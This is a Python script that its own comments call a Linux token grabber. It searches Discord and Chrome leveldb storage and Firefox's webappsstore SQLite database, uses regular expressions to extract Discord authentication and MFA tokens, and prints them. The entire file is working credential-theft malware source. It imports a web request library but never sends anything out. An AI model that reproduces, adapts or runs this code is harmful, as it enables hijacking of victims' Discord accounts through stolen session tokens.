# Nips token from leveldb
# Created by Zackery .R. Smith | github.com/ZackeryRSmith
# Why does nobody create a linux token grabber...

from os import path, listdir
from re import findall
from typing import (
    Optional,
    Any
)
import sqlite3
from requests import get


##################################
# CONSTANTS
##################################

HOME = path.expanduser("~")+"/"
CONFIG = HOME + ".config/" 
PATHS = {
    "Discord"           : CONFIG   + "discord/",
    "Discord Canary"    : CONFIG   + "discordcanary/",
    "Discord PTB"       : CONFIG   + "discordptb/",
    "Google Chrome"     : CONFIG   + "google-chrome/Default/",
    "Firefox"           : HOME     + ".mozilla/firefox/"
    #"Opera"             : CONFIG   + "opera/",
    #"Brave"             : LOCAL    + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
}


##################################
# NIP
##################################

def nip():
    """ Nips token from leveldb (Or SQLite) """
    tokens = []
    for platform, loc in PATHS.items():
        if platform == "Firefox":
            ## Unlike Chromium based browsers which use leveldb, Firefox uses SQLite.
            ## Because of this we must deal with Firefox as a whole other thing
            # Get all profiles
            profiles = [x for x in listdir(loc) if "default" in x]
            for profile in profiles:
                # Check if "webappsstore.sqlite" exists
                if "webappsstore.sqlite" in listdir(loc+"/"+profile+"/"):
                    database = loc+"/"+profile+"/webappsstore.sqlite"
                    # Try to connect to sqlite database
                    conn = None
                    try:
                        conn = sqlite3.connect(database)
                    except:
                        continue  # An issue has come up connecting to database (It may be corrupted)
                    finally:
                        if conn:
                            # Create cursor and get all rows
                            cur = conn.cursor()
                            cur.execute("SELECT * FROM webappsstore2")
                            rows = cur.fetchall()
                            # Get every row in the table 
                            for row in rows:
                                # Sort trough row to find token
                                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                    # Loop trough all tokens found
                                    for token in findall(regex, str(row)):
                                        # Stop duplicates
                                        if not token in tokens:
                                            tokens.append(token)
        else:
            # Loc = Path | Switched to allow `path` (OS Module)
            loc += "/Local Storage/leveldb"
            # Check if leveldb exists
            if path.exists(loc):
                # Get every file
                for file_name in listdir(loc):
                    # Get all files a token can be located in
                    if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                        # Get every line and clean it slightly (To a RegEx-able state)
                        for line in [x.strip() for x in open(f"{loc}/{file_name}", errors="ignore").readlines() if x.strip()]:
                            # Sort trough line to find token
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                # Loop through all tokens found
                                for token in findall(regex, line):
                                    # Stop duplicates
                                    if not token in tokens:
                                        tokens.append(token)
    return tokens

print(nip())
